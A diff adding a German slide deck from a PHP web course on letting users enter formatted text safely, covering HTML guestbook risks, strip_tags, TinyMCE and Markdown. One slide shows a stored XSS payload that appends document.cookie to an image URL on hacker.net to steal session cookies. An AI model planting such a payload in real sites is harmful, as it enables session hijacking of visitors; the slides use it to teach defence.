@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="de" style="background-color: #cff0f1;">
+  <head>
+    <meta charset="utf-8" />
+    <title>HTML erlauben - als Präsentation</title>
+    <meta name="viewport" content="width=1024, user-scalable=no" />
+
+    <!-- Replace path with correct path to deck.core.css. -->
+    <link rel="stylesheet" href="/assets/css/deck.core.css" type="text/css" />
+    <link rel="stylesheet" href="/assets/css/style-theme.css" type="text/css" />
+    <link
+      rel="stylesheet"
+      href="/assets/css/transition-theme.css"
+      type="text/css"
+    />
+    <link rel="stylesheet" href="/assets/css/deck.goto.css" />
+    <link rel="stylesheet" href="/assets/css/deck.status.css" />
+    <link rel="stylesheet" href="/assets/css/deck.hash.css" />
+    <link rel="stylesheet" href="/assets/css/style.css" />
+
+    <style>
+      /* google code prettify */
+      li.L0,
+      li.L1,
+      li.L2,
+      li.L3,
+      li.L5,
+      li.L6,
+      li.L7,
+      li.L8 {
+        list-style-type: inherit !important;
+      }
+      li.L1,
+      li.L3,
+      li.L5,
+      li.L7,
+      li.L9 {
+        background: none repeat scroll 0 0 #eefeee;
+      }
+      ol.linenums {
+        margin-left: 80px !important;
+      }
+
+      /* deck */
+      h4.caption {
+        color: #999999;
+      }
+      h4.caption small {
+        color: black;
+      }
+      table.table-bordered {
+        border-collapse: separate;
+      }
+      table.table-bordered td,
+      table.table-bordered th {
+        border: 2px white solid;
+        padding: 2px;
+      }
+
+      .slide img[src$="svg"] {
+        width: 100%;
+      }
+    </style>
+
+    <!-- Any other extension CSS files go here. -->
+
+    <!-- Replace path with correct path to Modernizr file. -->
+    <script src="/assets/js/modernizr.custom.js"></script>
+  </head>
+  <body class="deck-container">
+    <!-- Create any number of elements with class slide within the container -->
+    <div class="slide">
+      <h1>HTML erlauben</h1>
+      <p>
+          vorige Präsentation:
+        <a href="/php-db-schreiben/daten-editieren//slide.html">Daten Bearbeiten</a> | 
+        <a href="/php-db-schreiben/html-erlauben/"
+          >zurück zum Buch-Kapitel [esc]</a
+        >
+         
+        | Nächste Präsentation
+        <a href="/php-db-schreiben/fehlerbehandlung//slide.html">Fehlerbehandlung</a>
+        
+      </p>
+    </div>
+    <div class="slide">
+<p>Welche Arten gibt es, die Formatierung von eingegeben Texten doch zu erlauben?
+Ohne dass dabei Sicherheitsprobleme auftreten.</p>
+
+</div>
+<div class="slide">
+
+<h2 id="html">HTML</h2>
+
+<p>Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags
+wieder anzeigen? Welche Probleme können dabei auftreten?</p>
+
+</div>
+<div class="slide">
+
+<h3 id="gefahren">Gefahren</h3>
+
+<p>Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist
+gefährlich! Dazu zwei Beispiele:</p>
+
+<p>Gustav Gastfreund baut auf unter der Adresse http//gustav.at ein Gästebuch in dem BesucherInnen
+beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;img src=&quot;http://lauscher.net/bild.php?woher=gaestebuch_mmt&quot; alt=&quot;harmloses bild&quot;&gt;
+</pre></div>
+
+<p>Das Bild wird also nicht von Webserver gustav.at geladen, sondern vom Webserver von
+Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes
+aufgerufen. D.h. Wenn Bernhard Besucher das Gästebuch ansurft
+dann sieht Herr Lauscher einen Zugriff auf bild.php auf seinem Server, und kann 
+das mit-loggen. Falls Herr Lauscher die Gästebuch-Besucher schon
+kennt (ein Cookie bei ihnen gesetzt hat) kann er die Leute auch identifizieren.</p>
+
+<p>Gustav Gastfreunt  hat Herrn Lauscher also die Möglichkeit gegeben sehr viel über die
+BesucherInne zu erfahren.</p>
+
+<p>So etwas ähnliches passiert z.B. wenn Sie Google
+Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen:
+Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele
+BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer
+vorhergehenden Suche noch ein Cookie haben.)</p>
+
+</div>
+<div class="slide">
+
+
+
+<p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ins
+Gästebuch ein:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+Hallo Welt 
+
+&lt;img src=&quot;http://hacker.net/bild.php&quot; alt=&quot;harmlos&quot; id=&quot;hack_tool&quot; /&gt;
+&lt;script&gt;
+document.getElementById(&quot;hack_tool&quot;).src += &quot;?c=&quot; + document.cookie;
+&lt;/script&gt;
+</pre></div>
+
+<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
+
+<div class="example">
+<pre class="lang-html prettyprint linenums">
+&lt;img id=&quot;hack_tool&quot; alt=&quot;harmloses bild&quot; 
+src=&quot;http://hacker.net/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115&quot;/&gt;
+</pre></div>
+
+<p>So kann Frau Hacker das Cookie einer BesucherIn des Gästebuchs entwenden. Sie
+kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
+
+<p>Was lernen wir daraus?</p>
+
+<p>Niemals, niemals, niemals zulassen, dass Fremde Javascript in Ihre Site einspeisen können!</p>
+
+</div>
+<div class="slide">
+
+
+
+<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code
+z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und
+„wirkt nicht“:</p>
+
+<p><img src="/images/html-escaped.png" srcset="/images/html-escaped1.png 1x, /images/html-escaped.png 1x"  alt="Eingegebener HTML+Javascript-Code wird escaped und dargestellt" ></p>
+
+</div>
+<div class="slide">
+
+<h3 id="eingabe-von-html">Eingabe von HTML</h3>
+
+<p>Wenn Sie sich entscheiden die Eingabe von HTML zu zu lassen, 
+dann können Sie das mit einer einfachen <code>textarea</code> tun.</p>
+
+<p>Mit einem Javascript-Editor wie TinyMCE wird die Eingabe aber sehr
+vereinfacht: TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
+
+<p><img src="/images/tinymce.png" srcset="/images/tinymce@2x.png 2x, /images/tinymce.png 1x"  alt="Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" ></p>
+
+</div>
+<div class="slide">
+
+<h3 id="abspeichern-von-html">Abspeichern von HTML</h3>
+
+<p>Bevor wir das eingegeben HTML abspeichern, wollen wir es
+streng kontrollieren: Im Profil sollen nur die HTML-Tags
+<code>&lt;p&gt;</code> und <code>&lt;b&gt;</code> verwendet werden können, mehr nicht.</p>
+
+<p>Bevor die Daten also in dei Datenbank kommen werden
+alle anderen Tags entfernt:</p>
+
+<div class="example">
+<pre class="lang-php prettyprint linenums">
+$description = strip_tags( $_POST[&#39;description&#39;], &quot;&lt;p&gt;&lt;b&gt;&quot; );
+</pre></div>
+
+</div>
+<div class="slide">
+
+
+
+<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das Escapen 
+der <code>description</code> verzichten:</p>
+
+<div class="example">
+<h4 class="caption">Php Code <small>Ausgabe von Daten aus der Datenbank mit html-escaping</small></h4>
+<pre class="lang-php prettyprint linenums">
+$username    = htmlspecialchars( $person-&gt;username     );
+$firstname   = htmlspecialchars( $person-&gt;firstname    );
+$surname     = htmlspecialchars( $person-&gt;surname      );
+$description = strip_tags( $person-&gt;description,  &quot;&lt;p&gt;&lt;b&gt;&quot; );
+
+echo &lt;&lt;&lt;EOM
+  &lt;p&gt;$anrede $vorname $nachname hat insgesamt 
+  $no Werke in dieser Datenbank.
+  $ersie hat den Usernamen $username.&lt;/p&gt;
+
+  &lt;div&gt;$description&lt;/div&gt;
+EOM;
+</pre></div>
+
+</div>
+<div class="slide">
+
+<h2 id="markdown">Markdown</h2>
+
+<p>Markdown ist eine sehr simple Formatierungs-Sprache - viel einfacher als HTML.</p>
+
+<div class="example">
+<h4 class="caption">Plain Code <small>Beispiel für einen Text in Markdown</small></h4>
+<pre class="lang-plain prettyprint linenums">
+  ### Abspeichern von HTML
+
+  Bevor wir das eingegeben HTML abspeichern, wollen wir es
+  streng kontrollieren: Im Profil sollen nur die HTML-Tags
+  `&lt;p&gt;` und `&lt;b&gt;` verwendet werden können, mehr nicht. 
+</pre></div>
+
+<p>Dieses Format wird in der Datenbank gespeichert. Erst bei
+der Ausgabe als HTML wird Markdown in HTML verwandelt.</p>
+
+</div>
+<div class="slide">
+
+<h3 id="markdown-eingeben">Markdown eingeben</h3>
+
+<p>Für Markdown gibt es wieder eigene editoren, z.B. https://simplemde.com/</p>
+
+<p><img src="simplemde.png"  alt="Screenshot von SimpleMDE" ></p>
+
+</div>
+<div class="slide">
+
+<h3 id="markdown-darstellen">Markdown darstellen</h3>
+
+<p>Mit einem “Markdown Parser” wird das Markdown-Format gelesen und
+in HTML übersetzt:</p>
+
+<div class="example">
+<pre class="lang-php prettyprint linenums">
+include &#39;Parsedown.php&#39;;
+$Parsedown = new Parsedown();
+echo $Parsedown-&gt;text(&#39;## Hello HTML!&#39;);
+</pre></div>
+
+</div>
+    <div class="slide">
+      <h1>HTML erlauben</h1>
+      <p>
+          vorige Präsentation:
+        <a href="/php-db-schreiben/daten-editieren//slide.html">Daten Bearbeiten</a> | 
+        <a href="/php-db-schreiben/html-erlauben/"
+          >zurück zum Buch-Kapitel [esc]</a
+        >
+         
+        | Nächste Präsentation
+        <a href="/php-db-schreiben/fehlerbehandlung//slide.html">Fehlerbehandlung</a>
+        
+      </p>
+    </div>
+
+    <!-- Other extension HTML snippets go here, at the bottom of the deck container. -->
+    <!-- deck.status snippet -->
+    <p class="deck-status">
+      <span class="deck-status-current"></span>
+      /
+      <span class="deck-status-total"></span>
+    </p>
+
+    <!-- deck.hash snippet -->
+    <a href="." title="Permalink to this slide" class="deck-permalink">#</a>
+
+    <!-- Update these paths to point to the correct files. -->
+    <script src="/assets/js/jquery.min.js"></script>
+    <script src="/assets/js/deck.core.js"></script>
+    <script src="/assets/js/deck.hash.js"></script>
+    <script src="/assets/js/deck.goto.js"></script>
+    <script src="/assets/js/deck.status.js"></script>
+
+    <!-- Add any other extension JS files here -->
+    <script src="/assets/js/deck.escape.js"></script>
+    <script src="/assets/js/deck.fullscreen.js"></script>
+
+    <!-- Initialize the deck. You can put this in an external file if desired. -->
+    <script>
+      $(function() {
+        $.deck(".slide");
+      });
+    </script>
+  </body>
+</html>
